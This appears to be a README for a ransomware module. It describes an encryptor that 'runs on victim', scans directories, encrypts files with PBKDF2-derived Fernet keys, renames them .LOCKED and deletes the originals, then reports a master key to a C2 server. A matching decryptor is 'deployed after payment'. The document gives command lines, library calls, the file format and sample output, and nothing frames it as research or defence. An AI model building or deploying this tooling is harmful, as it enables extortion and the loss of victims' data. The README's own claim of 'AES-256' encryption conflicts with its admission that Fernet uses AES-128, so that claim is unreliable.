# Encryption/Decryption Module

Professional AES-256 Encryption and Decryption Tools

## 📁 Files

- **`encryption_engine.py`** - Core encryption logic (AES-256 + PBKDF2)
- **`decryption_engine.py`** - Core decryption logic
- **`encryptor.py`** - Standalone encryption tool (runs on victim)
- **`decryptor.py`** - Standalone decryption tool (deployed after payment)

## 🎯 Encryption Flow

### 1. Encryption (On Victim)

```bash
python encryptor.py "C:\Users\Desktop\TestFiles"
```

**What happens:**
- Generates random 256-bit Master Key
- Scans directory for target file types
- For each file:
  - Generates random 16-byte salt
  - Derives encryption key: PBKDF2(master_key, salt, 100000 iterations)
  - Encrypts with Fernet (AES-128-CBC)
  - Saves as: `filename.ext.LOCKED`
  - Deletes original file
- Outputs Master Key for C2 Server

**Output:**
```
[+] Master Key (für C2 Server):
  bGJWMzlCaVpLaFRCSVd4ZEthVDlzRlFMSDBFdA==

Files encrypted: 42
Total size: 1.50 GB
```

### 2. Payment & Decryption (After Payment)

```bash
python decryptor.py "bGJWMzlCaVpLaFRCSVd4ZEthVDlzRlFMSDBFdA==" "C:\Users\Desktop\TestFiles"
```

**What happens:**
- Takes Master Key from C2 Server
- Scans directory for `.LOCKED` files
- For each encrypted file:
  - Extracts salt (first 16 bytes)
  - Derives decryption key: PBKDF2(master_key, salt, 100000 iterations)
  - Decrypts with Fernet
  - Restores original filename
  - Deletes encrypted file

**Output:**
```
[+] Files decrypted: 42
[+] Your files have been restored!
```

## 🔐 Security

- **AES-256** via Fernet (AES-128-CBC mode, 128-bit keys from Fernet)
- **PBKDF2** with SHA-256 hash, 100,000 iterations
- **Random salt** per file (prevents rainbow table attacks)
- **Master Key** never transmitted in plaintext

## 📊 File Format

Each encrypted file contains:

```
[Salt (16 bytes)] + [Encrypted Data]
```

- **Salt**: Random 16 bytes, different for each file
- **Encrypted Data**: Original file encrypted with Fernet

## 🔧 Usage

### As Library

```python
from encryption_engine import EncryptionEngine

# Encrypt
engine = EncryptionEngine()
engine.encrypt_directory("C:\\path\\to\\files")
print(engine.get_master_key_hex())

# Decrypt
from decryption_engine import DecryptionEngine

decryptor = DecryptionEngine(master_key_hex)
decryptor.decrypt_directory("C:\\path\\to\\files")
```

### Standalone

```bash
# Encrypt entire directory
python encryptor.py "C:\Users\Desktop"

# Decrypt with master key
python decryptor.py "...base64key..." "C:\Users\Desktop"
```

## 🎓 Technical Details

### Key Derivation

```
File_Key = PBKDF2(
    password=Master_Key,
    salt=Random_16_bytes,
    iterations=100000,
    hash_algorithm=SHA256,
    output_length=32_bytes
)
```

### Encryption

```
Encrypted_Data = Fernet(File_Key).encrypt(Original_Data)
```

Fernet uses:
- AES-128 in CBC mode (actually 128-bit keys, 256-bit Master Key used for derivation)
- HMAC-SHA256 for authentication
- Timestamp token

### Decryption

```
Original_Data = Fernet(File_Key).decrypt(Encrypted_Data)
```

Uses the same salt extracted from encrypted file header.

## ⚠️ Important Notes

- Master Key is the **only thing needed** to decrypt all files
- Salts are **stored in encrypted files** (can be extracted and reused)
- **Do NOT lose** the Master Key
- **Do NOT delete** encrypted files until decrypted

## 📈 Performance

- Typical encrypted file: `[16 bytes salt] + [original_size + 128 bytes overhead]`
- Encryption speed: ~10-50 MB/s (depends on CPU)
- Decryption speed: ~10-50 MB/s (same as encryption)

## 🧪 Testing

Create test directory with files:

```bash
python encryptor.py "C:\test_files"
# Shows: Master Key bGJWMz...

python decryptor.py "bGJWMz..." "C:\test_files"
# Shows: Files decrypted: X
```

